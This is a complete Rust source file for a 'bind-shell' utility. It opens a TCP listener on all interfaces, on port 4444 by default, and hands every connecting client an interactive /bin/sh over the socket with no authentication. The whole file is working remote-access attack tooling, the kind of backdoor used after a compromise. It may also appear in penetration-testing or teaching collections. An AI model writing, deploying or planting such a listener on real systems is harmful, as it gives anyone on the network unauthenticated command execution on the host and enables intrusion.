use std::net::{TcpStream, TcpListener};
use std::os::fd::{OwnedFd, RawFd};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use std::{env, thread};
use clap::Parser;
use libc::dup;

use clap::command;

#[derive(Parser, Debug)]
#[command(name = "bind-shell", about = "Insecurely exposes a shell of your choosing on the network", version = "0.1")]
struct Args
{
    #[arg(default_value_t = 4444)]
    pub port : u16,

    #[arg(default_value = "/bin/sh")]
    pub shell : String,
}

fn handle_client(stream: TcpStream, shell : &str) {
    let fd : RawFd = stream.as_raw_fd();
    
    unsafe 
    {
        let stdin_fd : RawFd = dup(fd);
        let stdout_fd : RawFd = dup(fd);
        let stderr_fd : RawFd = dup(fd);

        Command::new(shell)
            .arg("-i")
            .stdin(Stdio::from_raw_fd(stdin_fd))
            .stdout(Stdio::from_raw_fd(stdout_fd))
            .stderr(Stdio::from_raw_fd(stderr_fd))
            .spawn()
            .unwrap()
            .wait()
            .unwrap();
    }
}

fn main() {
    let args = Args::parse();
    let port = args.port;
    let shell = args.shell;

    let listener = TcpListener::bind(format!("0.0.0.0:{}", port)).expect(&format!("Cannot bind to port {}. Is something using it?", port));
    println!("Listening on port {}...", port);

    for stream in listener.incoming() {
        let stream = stream.expect("An error occurred trying to handle an incoming connection");

        println!("New connection from {}", stream.peer_addr().unwrap());
        let clone = (&shell).clone();
        thread::spawn(move || {
            handle_client(stream, &clone);
        });
    }
}